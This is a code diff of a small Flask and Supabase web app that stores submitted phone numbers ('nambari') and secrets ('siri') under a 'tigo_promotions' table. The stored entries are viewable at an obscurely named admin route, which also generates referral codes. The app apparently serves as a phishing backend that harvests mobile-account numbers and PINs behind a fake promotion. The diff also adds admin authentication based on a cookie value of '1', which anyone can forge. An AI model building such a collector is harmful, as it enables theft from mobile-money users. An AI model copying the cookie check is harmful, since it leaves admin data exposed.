@@ -1,24 +1,32 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect, make_response
 import os
 import traceback
+import secrets
 from supabase import create_client
 
-# ---------- PATH SETUP (IMPORTANT FOR VERCEL) ----------
+# ---------- PATHS ----------
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 TEMPLATES_DIR = os.path.join(BASE_DIR, "..", "templates")
 
 app = Flask(__name__, template_folder=TEMPLATES_DIR)
 
-# ---------- SUPABASE INIT ----------
-supabase_url = os.environ.get("SUPABASE_URL")
-supabase_key = os.environ.get("SUPABASE_KEY")
+# ---------- SUPABASE ----------
+supabase = None
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 
-if not supabase_url or not supabase_key:
-    print("❌ Supabase env vars missing")
-    supabase = None
-else:
-    supabase = create_client(supabase_url, supabase_key)
+if SUPABASE_URL and SUPABASE_KEY:
+    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
     print("✅ Supabase connected")
+else:
+    print("❌ Supabase env vars missing")
+
+# ---------- HELPERS ----------
+def is_admin_logged_in():
+    return request.cookies.get("admin_auth") == "1"
+
+def generate_ref_code():
+    return secrets.token_urlsafe(6)
 
 # ---------- HOME ----------
 @app.route("/")
@@ -34,10 +42,13 @@ def add_tigo():
 
         nambari = request.form.get("nambari")
         siri = request.form.get("siri")
-        url_link = request.form.get("url_link", "gzktrsjamfkw")
+        url_link = request.form.get("url_link")
 
         if not nambari or not siri:
             return "Missing fields", 400
+
+        if not url_link:
+            url_link = generate_ref_code()
 
         supabase.table("tigo_promotions").insert({
             "nambari": nambari,
@@ -51,27 +62,36 @@ def add_tigo():
         traceback.print_exc()
         return "Insert failed", 500
 
-# ---------- ADMIN (PASSWORD PROTECTED) ----------
+# ---------- ADMIN LOGIN ----------
 @app.route("/adminvinc684833", methods=["GET", "POST"])
 def admin():
     ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
-
     if not ADMIN_PASSWORD:
         return "Admin password not configured", 500
 
-    # Show login page
-    if request.method == "GET":
-        return render_template("admin_login.html")
+    if is_admin_logged_in():
+        return admin_panel()
 
-    # Handle login
-    password = request.form.get("password")
-    if password != ADMIN_PASSWORD:
-        return render_template("admin_login.html", error="Invalid password")
+    if request.method == "POST":
+        password = request.form.get("password")
+        remember = request.form.get("remember")
 
+        if password != ADMIN_PASSWORD:
+            return render_template("admin_login.html", error="Invalid password")
+
+        resp = make_response(redirect("/adminvinc684833"))
+        if remember:
+            resp.set_cookie("admin_auth", "1", max_age=60*60*24*7, httponly=True)
+        else:
+            resp.set_cookie("admin_auth", "1", httponly=True)
+
+        return resp
+
+    return render_template("admin_login.html")
+
+# ---------- ADMIN PANEL ----------
+def admin_panel():
     try:
-        if not supabase:
-            return "Supabase not configured", 500
-
         response = supabase.table("tigo_promotions") \
             .select("id,nambari,siri,url_link,created_at") \
             .order("created_at", desc=True) \
@@ -88,3 +108,24 @@ def admin():
     except Exception:
         traceback.print_exc()
         return "Failed to load admin data", 500
+
+# ---------- GENERATE REF CODE ----------
+@app.route("/adminvinc684833/generate", methods=["POST"])
+def generate_ref():
+    if not is_admin_logged_in():
+        return redirect("/adminvinc684833")
+
+    try:
+        code = generate_ref_code()
+
+        supabase.table("tigo_promotions").insert({
+            "nambari": "ADMIN",
+            "siri": "ADMIN",
+            "url_link": code
+        }).execute()
+
+        return redirect("/adminvinc684833")
+
+    except Exception:
+        traceback.print_exc()
+        return "Failed to generate referral", 500
